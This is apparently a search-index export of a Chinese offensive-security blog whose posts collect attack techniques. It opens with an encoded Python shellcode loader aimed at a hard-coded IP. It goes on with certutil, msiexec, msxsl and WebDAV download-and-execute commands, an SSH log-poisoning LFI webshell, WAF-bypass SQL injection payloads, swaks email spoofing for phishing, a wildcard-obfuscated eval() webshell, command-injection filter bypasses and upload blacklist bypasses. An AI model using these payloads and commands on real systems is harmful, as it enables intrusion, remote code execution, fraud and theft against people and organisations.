YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==&quot;)8、certutileg: certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete9、msiexecmsiexec /q /i http://site.com/payloads/calc.pngcalc.pngmsfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png10、msxsl.exe(需下载)eg: msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl demo.xml &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;Microsoft&lt;/name&gt; &lt;/customer&gt; &lt;/customers&gt; exec.xsl &lt;?xml version=&apos;1.0&apos;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function xml(nodelist) { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;11、IEExeceg: C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe 细节：戳我 12、IEXPLORE.EXE这个需要IE存在可执行命令的漏洞eg: &quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; http://site.com/expexp可以使用类似ms14_064 13、当使用UNC/WebDAV时候多的几种姿势Cmd cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt Cscript/Wscript cscript //E:jscript \\webdavserver\folder\payload.txt Regasm/RegsvcC:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \webdavserver\folder\payload.dlldll 可以使用C#写的 Msbuildcmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot; pcalua.exe pcalua.exe -a \\server\payload.dll]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LFI SSH日志]]></title>
    <url>%2Farchives%2F8946a683.html</url>
    <content type="text"><![CDATA[登陆SSH：ssh &apos;&lt;?php system($_GET[‘c’]); ?&gt;&apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果。有16字符可控，足够了。 只可以没有x权限，要不然ssrf fastcgi就有意思了。]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[知己知彼，WAF是如何被绕过的？SQL注入常见手法解密。]]></title>
    <url>%2Farchives%2F7bcebf52.html</url>
    <content type="text"><![CDATA[常见的关系型数据库有mysql、SQL Server、Oracle、Sybase、DB2等。sql语句标准语句写法相同，但由于不同数据库都有自己专用函数，因此过滤的规则可能也有所不同。因常见数据库都为mysql，因此以下以mysql数据库标准语句举例： 关键字：and,or,select,update,delete,create,union,insert,net,truncate,exec,drop,declare,count,chr,mid,master,char,Sp_sqlexec,order by,where,limit等关键字符：&quot; &apos; &quot;(单引号)、&quot; &lt; &quot;（小于号）、&quot; &gt; &quot;(大于号)、&quot; ; &quot;(冒号)、&quot; ( &quot;(括号)、&quot; ) &quot;（括号）、&quot; * &quot;(星号)、&quot; % &quot;(百分号)、&quot; &quot;（空格）、&quot; -- &quot;(sql中的注释符)、&quot;#&quot;等sql绕过方法大全：1、大小写绕过例如And、anD2、编码绕过例如%55nIon(union)、%53elect(select)【url编码绕过、十六进制编码绕过、unicode编码绕过】3、特殊字符转换例如and可替换为&amp;&amp;、or可替换为||、空格过滤转换为%0a,+,或者/**/,%20,%09,%0b,%0c,%0d,%a0、“=”转换为like,greatest,between4、注释绕过例如un/**/ion、se/**/lect （常用注释符：//,-- ,/**/, #,--+,-- -,;--a ），内联注释绕过、/*!UNION*/5、等价函数与命令有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用 例如：hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir()6、使用一些特殊字符也可对其进行绕过，例如：`、~、!、@、()、[]、.、-、+ 、|、%00，举例关键字拆分：&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;、(SeL)(EcT)等7、http参数控制HPP(HTTP Parameter Polution)又称做重复参数污染最简单的就是?uid=1&amp;uid=2&amp;uid=3对于这种情况不同的Web服务器处理方式不一样 举例：/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users8、缓冲区溢出举例?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A&quot;重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出9、整合绕过整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了 举例： id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - 即： 注释+大小写+特殊字符绕过复杂的SQL注入常见手大体如此，WAF是如何被绕过的？这样就清楚了。那么我们在开发中，如何防止SQL注入，如何防止waf防绕过，心中也就有些眉目，就知道该如何应对了。]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？]]></title>
    <url>%2Farchives%2F368c71e.html</url>
    <content type="text"><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？ 现如今的钓鱼邮件都是通过注册相似的邮箱，或者设置邮箱的显示名称，盼着被害人有看走眼的那一刻，轻信邮件的内容。这种方法需要一定的社工技巧，以及诱导性的语言来诱使被害人上钩。但是对于有一定的经验以及眼力的人来说，还是可以识破骗子的伎俩。 下面我要介绍的这款工具可以最大程度的欺骗你的邮箱，更不要提你的眼睛。当然，此方法不是适用于任何邮箱，毕竟每种邮箱的过滤机制都不相同。gmail在这方面就做的不错。 Swaks - SMTP界的瑞士军刀基本用法： swaks –to &lt;要测试的邮箱&gt; 用来测试邮箱的连通性 root@kali:~# swaks --to xxxx@qq.com === Trying mx3.qq.com:25... === Connected to mx3.qq.com. &lt;- 220 newmx59.qq.com MX QQ Mail Server -&gt; EHLO kali &lt;- 250-newmx59.qq.com &lt;- 250-SIZE 73400320 &lt;- 250-STARTTLS &lt;- 250 OK -&gt; MAIL FROM:&lt;root@kali&gt; &lt;- 250 Ok -&gt; RCPT TO:&lt;xxxx@qq.com&gt; &lt;- 250 Ok -&gt; DATA &lt;- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Tue, 05 Jan 2016 23:15:11 -0500 -&gt; To: xxxx@qq.com -&gt; From: root@kali -&gt; Subject: test Tue, 05 Jan 2016 23:15:11 -0500 -&gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test mailing -&gt; -&gt; . &lt;** 550 Mail content denied. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 -&gt; QUIT &lt;- 221 Bye === Connection closed with remote host.前面都返回250ok，说明该邮箱存在，并且可以正常收信。最后可以看到qq邮箱返回550错误，qq官方给出的出错原因：该邮件内容涉嫌大量群发，并且被多数用户投诉为垃圾邮件。 我们可以继续对邮件进行伪造，来绕过qq邮箱的判断 比如： swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;其中： –from &lt;要显示的发件人邮箱&gt; –ehlo &lt;伪造的邮件ehlo头&gt; –body &lt;邮件正文&gt; –header &lt;邮件头信息，subject为邮件标题&gt;在你ip没有被qq邮箱band的情况下，邮件可以正常发送，返回250 ok。 高级用法：使用swaks其实还可以进行更高级的邮件伪造，几乎可以伪造邮件中的每一个参数。 –data &lt;源邮件&gt; 首先，我们需要一份正常的邮件 M亲测可用的伪造邮箱方法 swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;]]></content>
      <tags>
        <tag>知识普及</tag>
        <tag>奇淫技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thinkphp-漏洞列表]]></title>
    <url>%2Farchives%2Ff1b53e95.html</url>
    <content type="text"><![CDATA[Thinkphp-漏洞列表:`https://github.com/Maikefee/pochubs`Thinkphp3.2.3最新版update注入漏洞`https://www.anquanke.com/post/id/104847`ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell:https://xz.aliyun.com/t/99]]></content>
      <categories>
        <category>漏洞挖掘</category>
        <category>常见Cms漏洞</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux通配符绕过文件名黑名单]]></title>
    <url>%2Farchives%2F18ca0ec6.html</url>
    <content type="text"><![CDATA[文章来源: http://www.sohu.com/a/235200861_658302 通配符绕过黑名单,做免杀还是蛮有意思的,先做记录 1.原本的payload cmd=/bin/echo &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php 2.变形后的payload： cmd=/???/e??? &quot;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&quot; &gt; 1.php]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>Linux特性</category>
      </categories>
      <tags>
        <tag>Linux特性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于命令执行以及常见的一些绕过过滤的方法-浅谈CTF中命令执行与绕过的小技巧]]></title>
    <url>%2Farchives%2Fc6ef1d37.html</url>
    <content type="text"><![CDATA[https://blog.csdn.net/silence1_/article/details/96135760 http://pupiles.com/shellcode.html命令执行的一些绕过技巧 ① 空格过滤空格可以用以下字符串代替：&lt; 、%09、$IFS$9、 ${IFS}等 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 ② 一些命令分隔符%0a 符号、%0d 符号、; 符号、&amp; 符号、| 符号1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 ③ 黑名单绕过1、拼接绕过比如：a=l;b=s;$a$b 上面的第二道题目也是利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b2、base64解码绕过比如：echo MTIzCg==|base64 -d 其将会打印1233、单引号和双引号绕过比如：ca&apos;&apos;t flag 或ca&quot;&quot;t flag4、反斜杠绕过比如：ca\t fl\ag④长度限制长度限制可以用文件构造的方式来绕过。linux下可以用 1&gt;a创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行 利用这些特性，即可以成功绕过长度限制来执行命令。\ M 亲测有效浅谈CTF中命令执行与绕过的小技巧]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)]]></title>
    <url>%2Farchives%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[一、前言大家好,我叫MaiKeFee,是一名信息安全爱好者,初次见面,先水一篇文章再说.前几天在深圳出差,遇到一个黑名单上传点(Linux+Php(版本未知)),除了Php|Aspx|Jsp|Php3等等类似脚本都试过不能上传,其余可上传;于是第一时间想到测试%00截断显然是不能上传,不然也不会有此下文. 随后随手测试了: %00截断不能上传(实战环境+Linux+nginx+php(未知版本)),但是%0a、%0d,没想到竟然能上传了!!但是很遗憾,它不解析;为了寻找原因开始搭建环境复现.. 二、环境搭建 哒哒哒,环境搭好了,接下来开始测试啦 测试环境:Win+phpstudy(PHP Version 5.4.45)+上传黑名单 1.测试%00截断(上传成功并解析) 2.接下来是测试%0a截断(上传成功并解析) 3.接下来是测试%0d截断(上传失败并报错) 三、Fuzzing根据这样的特性,写个脚本生成Payload(%00-%99)(a-z)进行fuzzing 拿起来fuzzing就是一把梭 经过梭哈后,发现这些空payload,基本都可以绕过黑名单(%00|%0a|%8b|%8c|%8d..) 当然,要是提到黑名单绕过的姿势还是挺多的: 1.根据win的特性,空格也是可以绕过的2.::$DATA数据流绕过,NTFS文件系统特性绕过 3.php3、php5..4.点号(.)绕过,Win特性… 就不一一举例,本人项目环境是(Linux+nginx),绕过黑名单,但是不解析,在Win下测试,绕过后可解析(暂没深入)..总结:遇到00截断不成功的情况下,测试了0a可以成功绕过(估计跟php版本有关,待考察) 但是值得一提的是此文和网上提到https://www.freebuf.com/articles/web/179401.html 这里均提到版本问题,但本人测试环境Php5.4.45,可00截断并解析,这里暂时无从考证了,知道的大佬指点一下迷津!]]></content>
      <categories>
        <category>漏洞挖掘</category>
        <category>上传漏洞</category>
      </categories>
  </entry>
</search>
